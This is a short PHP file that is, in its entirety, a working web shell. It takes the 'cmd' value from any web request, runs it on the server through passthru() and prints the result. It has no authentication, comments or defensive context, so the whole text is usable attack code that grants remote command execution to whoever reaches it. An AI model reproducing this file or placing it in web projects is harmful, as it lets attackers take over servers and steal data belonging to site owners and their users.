<?php
$Mcmd = $_REQUEST['cmd'];
print "<pre>";
$output = passthru($Mcmd);
echo $output;
?>